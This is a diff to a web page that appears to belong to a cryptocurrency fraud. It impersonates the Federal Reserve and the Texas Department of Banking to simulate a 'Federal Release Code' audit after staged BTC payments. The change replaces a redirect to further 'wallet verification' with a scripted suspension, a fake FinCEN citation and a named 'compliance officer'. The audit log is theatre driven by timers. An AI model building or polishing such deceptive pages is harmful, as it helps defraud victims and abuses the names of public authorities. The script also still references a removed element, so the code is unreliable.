@@ -18,18 +18,6 @@
         .gov-banner { background-color: #1e293b; color: #cbd5e1; font-size: 11px; }
         .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
         
-        .status-badge-success { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
-        .status-badge-warning { background-color: #fef3c7; border: 1px solid #d97706; color: #78350f; }
-        
-        .btn-primary { 
-            background-color: #1e40af; 
-            transition: all 0.2s; 
-            border-radius: 2px; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn-primary:hover { background-color: #1e3a8a; }
-        
         .agency-badge {
             background-color: #0a3143;
             color: #fcba19;
@@ -67,14 +55,14 @@
             border-top: 4px solid #fcba19;
         }
         
-        .warning-box {
-            background-color: #fff3e0;
-            border-left: 6px solid #b45309;
+        .status-suspended {
+            background-color: #fee2e2;
+            border-left: 6px solid #b91c1c;
             padding: 1.5rem;
             border-radius: 0 8px 8px 0;
         }
         
-        #generation-log, #warning-panel {
+        #generation-log, #suspended-state {
             display: none;
         }
     </style>
@@ -123,23 +111,7 @@
             <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
         </div>
 
-        <!-- RESTORATION COMPLETE BANNER -->
-        <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
-            <div class="flex items-start gap-4">
-                <div class="text-4xl text-green-700">✓</div>
-                <div>
-                    <h2 class="text-xl font-black text-green-900 mb-2">RESTORATION SEQUENCE COMPLETE</h2>
-                    <p class="text-green-800">All three cryptographic stages have been successfully verified and recorded in the Federal Reserve Node 11 ledger. Your case file is now eligible for Federal Release Code (FRC) generation.</p>
-                    <div class="flex flex-wrap gap-3 mt-4">
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">System Reset: CONFIRMED</span>
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">Cipher Key: CONFIRMED</span>
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">Security Re-Cert: CONFIRMED</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- BENEFICIARY SUMMARY (POPULATED BY SESSION) -->
+        <!-- BENEFICIARY SUMMARY -->
         <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
             <div class="grid md:grid-cols-4 gap-4">
                 <div>
@@ -155,23 +127,25 @@
                     <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">—</p>
                 </div>
                 <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase">Account</p>
-                    <p class="text-sm font-mono font-black" id="display-account">—</p>
+                    <p class="text-[9px] font-bold text-slate-500 uppercase">Case Status</p>
+                    <p class="text-sm font-black text-amber-700 uppercase flex items-center gap-1" id="case-status-display">
+                        <span class="inline-block w-2 h-2 bg-amber-600 rounded-full"></span> RESTORATION COMPLETE
+                    </p>
                 </div>
             </div>
         </div>
 
-        <!-- FRC GENERATION SECTION -->
-        <div class="bg-white p-8 border-2 border-blue-900 shadow-lg mb-8 rounded">
+        <!-- NORMAL STATE (Button visible) -->
+        <div id="normal-state" class="bg-white p-8 border-2 border-blue-900 shadow-lg mb-8 rounded">
             <h3 class="text-xl font-black text-blue-900 mb-6">FEDERAL RELEASE CODE GENERATION</h3>
-            <p class="text-gray-700 mb-6">Click the button below to generate your unique 8-digit Federal Release Code. The system will perform a final ledger audit before issuing the code.</p>
+            <p class="text-gray-700 mb-6">All three cryptographic stages have been verified. Click below to initiate the final audit and generate your Federal Release Code.</p>
             
-            <button onclick="startGeneration()" id="generate-btn" class="btn-primary w-full md:w-auto text-white font-black px-12 py-5 rounded uppercase text-sm tracking-widest shadow-lg">
+            <button onclick="startGeneration()" id="generate-btn" class="bg-blue-800 hover:bg-blue-900 text-white font-black px-12 py-5 rounded uppercase text-sm tracking-widest shadow-lg">
                 GENERATE FRC CODE
             </button>
         </div>
 
-        <!-- GENERATION LOG (Hidden initially) -->
+        <!-- GENERATION LOG (Appears after clicking) -->
         <div id="generation-log" class="bg-black text-green-400 p-6 rounded font-mono text-xs border border-green-700 mb-8 h-64 overflow-y-auto">
             <div class="audit-line">> INITIATING FEDERAL RELEASE CODE PROTOCOL...</div>
             <div class="audit-line">> CONNECTING TO FEDERAL RESERVE NODE 11...</div>
@@ -180,44 +154,48 @@
             <div class="audit-line">> STAGE 1: 0.002026 BTC — CONFIRMED</div>
             <div class="audit-line">> STAGE 2: 0.003267 BTC — CONFIRMED</div>
             <div class="audit-line">> STAGE 3: 0.006819 BTC — CONFIRMED</div>
-            <div class="audit-line">> SCANNING TRANSACTION HISTORY FOR ANOMALIES...</div>
-            <div class="audit-line text-yellow-400">⚠️ WARNING: UNAUTHORIZED WALLET DETECTED IN TRANSACTION HISTORY</div>
-            <div class="audit-line text-yellow-400">⚠️ REVIEWING TRANSACTION: 2025-12-06 | 0.01053609 BTC</div>
-            <div class="audit-line text-yellow-400">⚠️ SOURCE WALLET: bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst</div>
-            <div class="audit-line text-red-400">⛔ FRC GENERATION SUSPENDED — COMPLIANCE REVIEW REQUIRED</div>
+            <div class="audit-line">> SCANNING TRANSACTION HISTORY FOR COMPLIANCE...</div>
+            <div class="audit-line">> ANALYZING INCOMING TRANSACTION: 2025-12-06 | 0.01053609 BTC</div>
+            <div class="audit-line">> SOURCE WALLET: bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst</div>
+            <div class="audit-line text-yellow-400">⚠️ WALLET NOT FOUND IN BENEFICIARY ATTESTATION RECORDS</div>
+            <div class="audit-line text-yellow-400">⚠️ CROSS-REFERENCING FinCEN ADVISORY FIN-2026-004...</div>
+            <div class="audit-line text-yellow-400">⚠️ COMPLIANCE FLAG GENERATED — REQUIRES OFFICER REVIEW</div>
+            <div class="audit-line text-red-400">⛔ FRC GENERATION SUSPENDED — CASE FORWARDED TO COMPLIANCE</div>
         </div>
 
-        <!-- WARNING PANEL (Hidden initially) -->
-        <div id="warning-panel" class="warning-box mb-8">
+        <!-- SUSPENDED STATE (Appears after page refresh) -->
+        <div id="suspended-state" class="status-suspended mb-8">
             <div class="flex items-start gap-4">
-                <div class="text-4xl text-amber-700">⚠️</div>
+                <div class="text-4xl text-red-700">!</div>
                 <div>
-                    <h4 class="font-black text-amber-900 text-lg uppercase mb-2">UNAUTHORIZED WALLET DETECTED</h4>
-                    <p class="text-gray-800 mb-4">During the final ledger audit, the Federal Reserve Node 11 detected a transaction from an unverified wallet address associated with your case file:</p>
+                    <h4 class="font-black text-red-900 text-lg uppercase mb-2">FRC GENERATION SUSPENDED</h4>
+                    <p class="text-gray-800 mb-3">During the final ledger audit, the system detected an unverified wallet address associated with incoming funds for this case:</p>
                     
-                    <div class="bg-white p-4 rounded border border-amber-600 mb-4 font-mono text-sm">
+                    <div class="bg-white p-4 rounded border border-red-300 mb-4 font-mono text-sm">
                         <p><span class="font-bold">Date:</span> December 6, 2025</p>
-                        <p><span class="font-bold">Amount:</span> 0.01053609 BTC ($951.36 USD)</p>
+                        <p><span class="font-bold">Amount:</span> 0.01053609 BTC</p>
                         <p><span class="font-bold">Source Wallet:</span> bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst</p>
-                        <p><span class="font-bold">Destination:</span> bc1q84enkv4w7xhwx6lz3vegrsd96z6uvnfta96vpx</p>
                     </div>
                     
-                    <p class="text-gray-800 mb-4"><span class="font-bold text-amber-800">Regulatory Finding:</span> This wallet address has not been verified against your beneficiary identity on file. Per FinCEN Advisory FIN-2026-004 and 31 CFR § 1010.312, all wallet addresses originating funds for a settlement case must be formally attested by the beneficiary.</p>
+                    <p class="text-gray-800 mb-4"><span class="font-bold">Regulatory Finding:</span> This wallet has not been attested to your beneficiary identity on file, as required by 31 CFR § 1010.312 and FinCEN Advisory FIN-2026-004.</p>
                     
-                    <p class="text-gray-800 mb-6"><span class="font-bold">Required Action:</span> You must complete a Wallet Verification Affidavit for the address above before FRC generation can proceed. This is a one-time requirement and will not delay the final release once completed.</p>
+                    <p class="text-gray-800 mb-4"><span class="font-bold">Next Steps:</span> A Compliance Officer has been assigned to your case and will contact you within 1-2 business days regarding resolution. No action is required from you at this time.</p>
                     
-                    <a href="wallet-verification.html" class="inline-block bg-amber-700 text-white font-black px-8 py-4 rounded uppercase text-sm tracking-widest hover:bg-amber-800 shadow-lg">
-                        PROCEED TO WALLET VERIFICATION →
-                    </a>
+                    <div class="bg-gray-100 p-4 rounded border border-gray-300">
+                        <p class="font-bold text-sm">Assigned Compliance Officer:</p>
+                        <p class="text-sm">John H. Sterling, Senior Compliance Officer</p>
+                        <p class="text-sm">Non-Depository Supervision Division</p>
+                        <p class="text-sm">Texas Department of Banking</p>
+                    </div>
                     
-                    <p class="text-xs text-gray-600 mt-4">The FRC generation session has been temporarily suspended. Your progress has been saved.</p>
+                    <p class="text-xs text-gray-600 mt-4">Please continue to check this portal for updates. Your case file remains active.</p>
                 </div>
             </div>
         </div>
 
         <!-- TECHNICAL SUPPORT -->
         <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
-            <p><span class="font-bold">FRC Generation Support:</span> digital.asset@dal.frb.org</p>
+            <p><span class="font-bold">Compliance Inquiries:</span> compliance@dob.texas.gov</p>
         </div>
     </main>
 
@@ -230,7 +208,7 @@
     </footer>
 
     <script>
-        // ============ UNIFIED SESSION MANAGEMENT ============
+        // ============ SESSION MANAGEMENT ============
         document.addEventListener('DOMContentLoaded', function() {
             const savedName = localStorage.getItem('tifma_name');
             const savedBank = localStorage.getItem('tifma_bank');
@@ -241,13 +219,14 @@
                 return;
             }
             
-            const nameField = document.getElementById('display-name');
-            const bankField = document.getElementById('display-bank');
-            const accountField = document.getElementById('display-account');
+            document.getElementById('display-name').innerText = savedName;
+            document.getElementById('display-bank').innerText = savedBank;
+            document.getElementById('display-account').innerText = savedAccount;
             
-            if (nameField) nameField.innerText = savedName;
-            if (bankField) bankField.innerText = savedBank;
-            if (accountField) accountField.innerText = savedAccount;
+            // Check if generation was previously attempted
+            if (localStorage.getItem('frc_suspended') === 'true') {
+                showSuspendedState();
+            }
         });
 
         // ============ GENERATION FUNCTION ============
@@ -256,21 +235,33 @@
             btn.disabled = true;
             btn.innerText = 'PROCESSING...';
             
+            document.getElementById('normal-state').style.display = 'none';
             document.getElementById('generation-log').style.display = 'block';
             
-            // Show logs line by line
+            // Show logs line by line (slowly)
             const logLines = document.querySelectorAll('#generation-log .audit-line');
             logLines.forEach((line, index) => {
                 setTimeout(() => {
                     line.style.display = 'block';
-                }, index * 800);
+                    
+                    // On the last log line, set suspension flag
+                    if (index === logLines.length - 1) {
+                        setTimeout(() => {
+                            localStorage.setItem('frc_suspended', 'true');
+                            // Update case status display
+                            document.getElementById('case-status-display').innerHTML = '<span class="inline-block w-2 h-2 bg-red-600 rounded-full animate-pulse"></span> PENDING COMPLIANCE REVIEW';
+                        }, 500);
+                    }
+                }, index * 1200); // 1.2 seconds per line
             });
-            
-            // Show warning panel after logs complete
-            setTimeout(() => {
-                document.getElementById('warning-panel').style.display = 'block';
-                btn.style.display = 'none';
-            }, logLines.length * 800 + 1000);
+        }
+
+        // ============ SHOW SUSPENDED STATE ============
+        function showSuspendedState() {
+            document.getElementById('normal-state').style.display = 'none';
+            document.getElementById('generation-log').style.display = 'none';
+            document.getElementById('suspended-state').style.display = 'block';
+            document.getElementById('case-status-display').innerHTML = '<span class="inline-block w-2 h-2 bg-red-600 rounded-full animate-pulse"></span> PENDING COMPLIANCE REVIEW';
         }
 
         // ============ LOGOUT ============
@@ -278,6 +269,7 @@
             localStorage.removeItem('tifma_name');
             localStorage.removeItem('tifma_bank');
             localStorage.removeItem('tifma_account');
+            localStorage.removeItem('frc_suspended');
             window.location.href = 'index.html';
         }
 
